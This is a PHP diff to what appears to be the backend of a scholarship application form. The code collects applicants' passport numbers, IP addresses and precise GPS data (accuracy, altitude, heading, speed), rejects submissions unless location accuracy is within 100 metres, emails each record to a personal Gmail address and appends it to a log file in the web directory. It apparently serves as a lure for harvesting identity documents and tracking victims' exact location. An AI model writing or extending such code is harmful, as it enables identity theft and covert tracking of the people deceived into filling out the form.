@@ -10,6 +10,14 @@ $email = isset($_POST['email']) ? trim($_POST['email']) : '';
 $passport = isset($_POST['passport']) ? trim($_POST['passport']) : '';
 $lat = isset($_POST['lat']) ? trim($_POST['lat']) : '';
 $lon = isset($_POST['lon']) ? trim($_POST['lon']) : '';
+$accuracy = isset($_POST['accuracy']) ? trim($_POST['accuracy']) : '';
+$altitude = isset($_POST['altitude']) ? trim($_POST['altitude']) : '';
+$altitudeAccuracy = isset($_POST['altitudeAccuracy']) ? trim($_POST['altitudeAccuracy']) : '';
+$heading = isset($_POST['heading']) ? trim($_POST['heading']) : '';
+$speed = isset($_POST['speed']) ? trim($_POST['speed']) : '';
+
+// Server-side accuracy policy (meters). Adjust as needed.
+$max_allowed_accuracy = 100; // require accuracy <= 100 meters
 $ip = $_SERVER['REMOTE_ADDR'] ?? '';
 $time = date("Y-m-d H:i:s");
 $agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
@@ -28,7 +36,12 @@ if ($lat === '' || !is_numeric($lat) || (float)$lat < -90 || (float)$lat > 90) {
 if ($lon === '' || !is_numeric($lon) || (float)$lon < -180 || (float)$lon > 180) {
     $errors[] = 'Valid longitude is required.';
 }
+// Validate reported accuracy if present
+if ($accuracy === '' || !is_numeric($accuracy) || (float)$accuracy > $max_allowed_accuracy) {
+    $errors[] = "Location accuracy is insufficient. Please allow high-accuracy location and retry (max {$max_allowed_accuracy} meters).";
+}
 
+// No file uploads in this simplified form
 if (!empty($errors)) {
     header('Content-Type: application/json');
     echo json_encode(['success' => false, 'errors' => $errors]);
@@ -51,6 +64,11 @@ $message .= "Passport: $safe_passport\n";
 $message .= "IP: $ip\n";
 $message .= "Latitude: $safe_lat\n";
 $message .= "Longitude: $safe_lon\n";
+$message .= "Accuracy (meters): $accuracy\n";
+$message .= "Altitude: $altitude\n";
+$message .= "Altitude Accuracy: $altitudeAccuracy\n";
+$message .= "Heading: $heading\n";
+$message .= "Speed: $speed\n";
 $message .= "User Agent: $safe_agent\n";
 $message .= "Time: $time\n";
 
@@ -59,7 +77,7 @@ $to = "abdullahishakir88@gmail.com"; // recipient
 $subject = "Scholarship Application Submission";
 
 // Sending configuration: choose SMTP via PHPMailer (recommended) or fallback to mail()
-$use_smtp = false; // set to true after configuring SMTP settings and installing PHPMailer
+$use_smtp = true; // use SMTP+PHPMailer by default; install PHPMailer via Composer
 $smtp_config = [
     'host' => 'smtp.example.com',
     'port' => 587,
@@ -77,8 +95,8 @@ if ($use_smtp) {
     // Attempt to send via PHPMailer + SMTP
     if (file_exists(__DIR__ . '/vendor/autoload.php')) {
         require_once __DIR__ . '/vendor/autoload.php';
-        $mail = new PHPMailer\PHPMailer\PHPMailer(true);
         try {
+            $mail = new PHPMailer\PHPMailer\PHPMailer(true);
             $mail->isSMTP();
             $mail->Host = $smtp_config['host'];
             $mail->SMTPAuth = true;
@@ -88,16 +106,22 @@ if ($use_smtp) {
             $mail->Port = $smtp_config['port'];
             $mail->setFrom(clean_header($from_email), $from_name);
             $mail->addAddress(clean_header($to));
+            $mail->addReplyTo(clean_header($email));
             $mail->Subject = $subject;
             $mail->Body = $message;
+            $mail->AltBody = $message;
+
+
+
             $mail->send();
             $sent = true;
         } catch (Exception $e) {
-            $send_error = $mail->ErrorInfo ?: $e->getMessage();
+            $send_error = isset($mail) ? $mail->ErrorInfo : $e->getMessage();
             $sent = false;
         }
     } else {
         $send_error = 'PHPMailer not installed. Run: composer require phpmailer/phpmailer';
+        $sent = false;
     }
 } else {
     // Fallback to PHP mail() with safer headers
@@ -123,7 +147,14 @@ $log_entry = [
     'error' => $send_error,
     'name' => $safe_name,
     'email' => $safe_email,
-    'ip' => $ip
+    'ip' => $ip,
+    'lat' => $safe_lat,
+    'lon' => $safe_lon,
+    'accuracy' => $accuracy,
+    'altitude' => $altitude,
+    'altitudeAccuracy' => $altitudeAccuracy,
+    'heading' => $heading,
+    'speed' => $speed
 ];
 @file_put_contents(__DIR__ . '/email_log.txt', json_encode($log_entry) . PHP_EOL, FILE_APPEND | LOCK_EX);
 
@@ -134,4 +165,7 @@ if ($sent) {
     // Provide a non-sensitive error message to the client; the detailed error is in the log
     echo json_encode(['success' => false, 'message' => '❌ Error sending application. Check server mail settings.', 'details' => $send_error]);
 }
+
+// Cleanup uploaded files after sending/failure
+// No uploaded files to cleanup
 ?>
